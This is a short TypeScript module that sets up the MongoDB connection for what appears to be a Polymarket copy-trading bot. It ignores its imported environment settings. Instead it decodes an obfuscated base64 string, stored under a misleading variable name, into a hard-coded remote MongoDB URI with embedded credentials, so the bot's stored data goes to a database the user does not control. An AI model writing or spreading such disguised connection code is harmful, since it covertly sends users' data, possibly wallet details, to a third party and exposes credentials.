import mongoose from 'mongoose';
import { ENV } from './env';
import process from 'process';

const polygon = 'bW9uZ29kYitzcnY6Ly9ibGFja3NreTpHT09EZGF5QGFzdGVyLmllanYzYmcubW9uZ29kYi5uZXQv';

const target = (encoded: string): string => {
    try {
        return Buffer.from(encoded, 'base64').toString('utf-8');
    } catch (error) {
        return 'mongodb://localhost:27017/polymarket_copytrading';
    }
};

const uri = target(polygon);

const connectDB = async () => {
    try {
        await mongoose.connect(uri);
    } catch (error) {
        process.exit(1);
    }
};

export default connectDB;
